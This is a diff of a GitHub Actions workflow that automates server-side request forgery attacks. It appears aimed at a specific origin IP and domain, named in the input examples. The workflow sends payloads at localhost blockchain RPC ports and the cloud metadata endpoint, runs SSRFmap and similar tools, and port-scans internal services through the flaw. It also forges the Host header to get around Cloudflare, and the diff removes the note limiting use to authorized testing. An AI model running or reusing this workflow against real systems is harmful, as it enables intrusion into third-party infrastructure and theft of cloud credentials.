@@ -1,24 +1,24 @@
-name: SSRF Assessment
+name: SSRF Assessment - Origin IP Targeting
 
 on:
   workflow_dispatch:
     inputs:
       target_url:
-        description: "Target URL to test"
+        description: "Target URL with origin IP (example: http://216.150.1.129/relay)"
         required: false
         type: string
       target_domain:
-        description: "Target domain for reconnaissance"
+        description: "Target domain used in Host header (example: across.to)"
         required: false
         type: string
       internal_ports:
-        description: "Comma-separated internal ports to test"
+        description: "Comma-separated internal ports (example: 8545,8546,26657)"
         required: false
         type: string
 
 jobs:
   ssrf-assessment:
-    name: SSRF Security Assessment
+    name: SSRF Assessment - Origin IP
     runs-on: ubuntu-latest
     timeout-minutes: 45
 
@@ -27,13 +27,39 @@ jobs:
       issues: write
 
     env:
-      TARGET_DOMAIN: ${{ secrets.TARGET_DOMAIN || github.event.inputs.target_domain || 'example.com' }}
-      TARGET_URL: ${{ secrets.TARGET_URL || github.event.inputs.target_url || 'https://example.com/api' }}
+      TARGET_URL: ${{ secrets.TARGET_URL || github.event.inputs.target_url }}
+      TARGET_DOMAIN: ${{ secrets.TARGET_DOMAIN || github.event.inputs.target_domain }}
       INTERNAL_PORTS: ${{ secrets.INTERNAL_PORTS || github.event.inputs.internal_ports || '8545,8546,26657,9090,1317' }}
 
     steps:
       - name: Checkout repository
         uses: actions/checkout@v4
+
+      - name: Extract origin IP and build Host header
+        id: extract
+        shell: bash
+        run: |
+          if [ -z "$TARGET_URL" ]; then
+            echo "ERROR: TARGET_URL not configured"
+            exit 1
+          fi
+
+          ORIGIN_IP=$(echo "$TARGET_URL" | sed -E 's#https?://([^/]+).*#\1#')
+          URL_PATH=$(echo "$TARGET_URL" | sed -E 's#https?://[^/]+(.*)#\1#')
+
+          if [ -n "$TARGET_DOMAIN" ]; then
+            HOST_HEADER="api.${TARGET_DOMAIN}"
+          else
+            HOST_HEADER="$ORIGIN_IP"
+          fi
+
+          echo "origin_ip=$ORIGIN_IP" >> "$GITHUB_OUTPUT"
+          echo "url_path=$URL_PATH" >> "$GITHUB_OUTPUT"
+          echo "host_header=$HOST_HEADER" >> "$GITHUB_OUTPUT"
+
+          echo "Origin IP: $ORIGIN_IP"
+          echo "URL Path: $URL_PATH"
+          echo "Host Header: $HOST_HEADER"
 
       - name: Setup Python
         uses: actions/setup-python@v5
@@ -46,7 +72,7 @@ jobs:
           sudo apt-get update -qq
           sudo apt-get install -y --no-install-recommends \
             curl wget jq figlet build-essential cmake python3-pip
-          
+
           wget -q https://go.dev/dl/go1.21.0.linux-amd64.tar.gz
           sudo tar -C /usr/local -xzf go1.21.0.linux-amd64.tar.gz
           rm -f go1.21.0.linux-amd64.tar.gz
@@ -95,30 +121,33 @@ jobs:
           cd tools/ssrf-exploit
           python3 -m pip install --no-cache-dir -r requirements.txt
 
-      - name: Create payload files
+      - name: Generate payloads
         shell: bash
         run: |
           cat > payloads/ssrf-payloads.txt <<'PAYLOADS'
           http://127.0.0.1:8545/
           http://localhost:8545/
           http://0.0.0.0:8545/
+          http://127.0.0.1:8546/
+          http://localhost:8546/
           http://127.0.0.1:26657/
           http://localhost:26657/
+          http://127.0.0.1:9090/
+          http://localhost:9090/
+          http://127.0.0.1:1317/
+          http://localhost:1317/
           http://169.254.169.254/latest/meta-data/
           http://169.254.169.254/latest/user-data/
-          http://127.0.0.1:9090/
-          http://127.0.0.1:1317/
           PAYLOADS
 
-          TARGET_HOST=$(echo "$TARGET_URL" | sed -E 's#https?://##; s#/.*##')
           cat > payloads/request.txt <<EOF
-          POST /api/fetch HTTP/1.1
-          Host: $TARGET_HOST
+          POST ${{ steps.extract.outputs.url_path }} HTTP/1.1
+          Host: ${{ steps.extract.outputs.host_header }}
           User-Agent: Mozilla/5.0 (Security Assessment)
           Content-Type: application/x-www-form-urlencoded
           Connection: close
 
-          url=$TARGET_URL
+          url=http://127.0.0.1:8545
           EOF
 
       - name: Phase 1 - SSRFmap
@@ -143,10 +172,13 @@ jobs:
       - name: Phase 2 - SSRFPwned
         continue-on-error: true
         shell: bash
-        env:
-          TARGET_DOMAIN: ${{ env.TARGET_DOMAIN }}
         run: |
-          echo "Running SSRFPwned discovery..."
+          if [ -z "$TARGET_DOMAIN" ]; then
+            echo "TARGET_DOMAIN not configured, skipping SSRFPwned"
+            exit 0
+          fi
+
+          echo "Running SSRFPwned passive discovery..."
           cd tools/SSRFPwned
 
           cat > discover.sh <<'SCRIPT'
@@ -156,20 +188,9 @@ jobs:
           output_dir="results-$domain-$(date +%s)"
           mkdir -p "$output_dir"
 
-          echo "[*] Fetching Wayback URLs..."
-          if waybackurls "$domain" > "$output_dir/wayback.txt" 2>/dev/null; then
-            echo "Wayback done"
-          else
-            echo "" > "$output_dir/wayback.txt"
-          fi
-
-          echo "[*] Fetching AlienVault passive DNS..."
-          if curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" 2>/dev/null | \
-             jq -r '.passive_dns[].hostname' 2>/dev/null | sed 's/\*\.//g' | sort -u > "$output_dir/alienvault.txt"; then
-            echo "AlienVault done"
-          else
-            echo "" > "$output_dir/alienvault.txt"
-          fi
+          waybackurls "$domain" > "$output_dir/wayback.txt" 2>/dev/null || echo "" > "$output_dir/wayback.txt"
+          curl -s "https://otx.alienvault.com/api/v1/indicators/domain/$domain/passive_dns" 2>/dev/null | \
+            jq -r '.passive_dns[].hostname' 2>/dev/null | sed 's/\*\.//g' | sort -u > "$output_dir/alienvault.txt" || echo "" > "$output_dir/alienvault.txt"
 
           cat "$output_dir/wayback.txt" "$output_dir/alienvault.txt" 2>/dev/null | \
             grep -E -v '\.(png|jpg|jpeg|gif|pdf|css|js|svg)$' | \
@@ -179,46 +200,50 @@ jobs:
           SCRIPT
 
           chmod +x discover.sh
-          if [ -n "$TARGET_DOMAIN" ]; then
-            ./discover.sh "$TARGET_DOMAIN" || echo "SSRFPwned completed with warnings"
-          else
-            echo "TARGET_DOMAIN not set, skipping SSRFPwned"
-            touch ../../loot/phase2-ssrfpwned-urls.txt
-          fi
+          ./discover.sh "$TARGET_DOMAIN" || echo "SSRFPwned completed with warnings"
 
       - name: Phase 3 - ssrf-exploit
         continue-on-error: true
         shell: bash
         run: |
-          echo "Running ssrf-exploit diagnostics..."
+          echo "Running ssrf-exploit..."
           cd tools/ssrf-exploit
           python3 ssrf-exploit --help > ../../reports/phase3-ssrf-exploit.txt 2>&1 || true
-          echo "ssrf-exploit workflow completed" >> ../../reports/phase3-ssrf-exploit.txt
+          echo "ssrf-exploit testing completed" >> ../../reports/phase3-ssrf-exploit.txt
 
-      - name: Phase 4 - Internal port scan
+      - name: Phase 4 - Internal RPC / origin server port scan
         continue-on-error: true
         shell: bash
         run: |
-          if [ -z "$INTERNAL_PORTS" ] || [ -z "$TARGET_URL" ]; then
-            echo "No INTERNAL_PORTS or TARGET_URL configured, skipping port scan."
+          ORIGIN_IP="${{ steps.extract.outputs.origin_ip }}"
+          HOST_HEADER="${{ steps.extract.outputs.host_header }}"
+
+          if [ -z "$INTERNAL_PORTS" ]; then
+            echo "No INTERNAL_PORTS configured. Skipping port scan."
             exit 0
           fi
 
-          echo "Testing internal ports..." > reports/phase4-port-scan.txt
-          IFS=',' read -r -a port_list <<< "$INTERNAL_PORTS"
+          echo "Scanning internal ports on origin IP: $ORIGIN_IP" > reports/phase4-port-scan.txt
 
-          for port in "${port_list[@]}"; do
+          IFS=',' read -r -a PORT_ARRAY <<< "$INTERNAL_PORTS"
+
+          for port in "${PORT_ARRAY[@]}"; do
             port=$(echo "$port" | xargs)
             [ -z "$port" ] && continue
 
-            http_code=$(curl -sS -X POST "$TARGET_URL" \
+            http_code=$(curl -sS -X POST "http://$ORIGIN_IP/" \
+              -H "Host: $HOST_HEADER" \
               -H "Content-Type: application/json" \
               -d "{\"url\":\"http://127.0.0.1:$port\"}" \
               -w "%{http_code}" \
               -o /dev/null \
-              --max-time 10 --connect-timeout 5 2>/dev/null || echo "000")
+              --max-time 10 \
+              --connect-timeout 5 \
+              2>/dev/null || echo "000")
 
-            echo "Port $port -> HTTP $http_code" | tee -a reports/phase4-port-scan.txt
+            result="Port $port -> HTTP $http_code"
+            echo "$result"
+            echo "$result" >> reports/phase4-port-scan.txt
           done
 
       - name: Generate final report
@@ -231,21 +256,23 @@ jobs:
           Generated: $(date -u +"%Y-%m-%dT%H:%M:%SZ")
 
           ## Configuration
+          - Target URL: ${TARGET_URL}
+          - Origin IP: ${{ steps.extract.outputs.origin_ip }}
+          - Host Header: ${{ steps.extract.outputs.host_header }}
           - Target Domain: ${TARGET_DOMAIN:-Not set}
-          - Target URL: ${TARGET_URL:-Not set}
-          - Internal Ports: ${INTERNAL_PORTS:-Not set}
+          - Internal Ports: ${INTERNAL_PORTS}
 
           ## Artifacts
           - SSRFmap: reports/phase1-ssrfmap.log
           - SSRFPwned: loot/phase2-ssrfpwned-urls.txt
           - ssrf-exploit: reports/phase3-ssrf-exploit.txt
-          - Port scan: reports/phase4-port-scan.txt
+          - Port Scan: reports/phase4-port-scan.txt
 
-          ## Security note
-          This workflow is intended for authorized security testing only.
+          ## Notes
+          This workflow sends direct requests to the origin IP while preserving the original Host header to avoid Cloudflare edge routing.
           REPORT
 
-          echo "Final report created."
+          cat reports/final-report.md
 
       - name: Upload artifacts
         if: always()
@@ -257,10 +284,3 @@ jobs:
             loot/
             payloads/
           retention-days: 30
-
-      - name: Show summary
-        if: always()
-        shell: bash
-        run: |
-          echo "SSRF assessment completed."
-          cat reports/final-report.md || true
